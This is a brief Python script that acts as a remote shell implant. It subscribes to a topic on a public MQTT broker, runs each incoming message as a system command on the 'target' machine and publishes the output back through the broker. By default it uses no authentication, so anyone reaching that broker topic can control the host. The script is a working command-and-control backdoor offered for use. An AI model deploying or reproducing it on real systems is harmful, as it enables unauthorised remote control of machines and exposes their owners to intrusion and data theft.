import subprocess
import time
# try:
# 	import paho.mqtt.client as mqtt
# except:
# 	bashCommand="sudo pip3 install paho-mqtt"
# 	process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
# 	output, error = process.communicate()

# time.sleep(5)
import paho.mqtt.client as mqtt

# Do not use an publicly available broker
broker = "broker.hivemq.com"
port = 1883

username =None
password = None

# Set an topic for target to listen
topic_recieve = "target/"

# Set an topic for target to show output
topic_out = "output/"

# Set an topic for target to show output
topic_err = "error/"

def on_connect(client, userdata, flags, rc):
    print("Connected with result code "+str(rc))

    client.subscribe(topic_recieve)

def on_message(client, userdata, msg):
	bashCommand = msg.payload.decode('UTF-8')
	try:
		process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
		output, error = process.communicate()
		client.publish(topic_out,payload=output)
	except:
		client.connect(broker, port, 60)
		client.publish(topic_err,payload="Error Occured")
	
	
client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message

# Uncomment to input username and password
# client.username_pw_set(username, password)
client.connect(broker, port, 60)

client.loop_forever()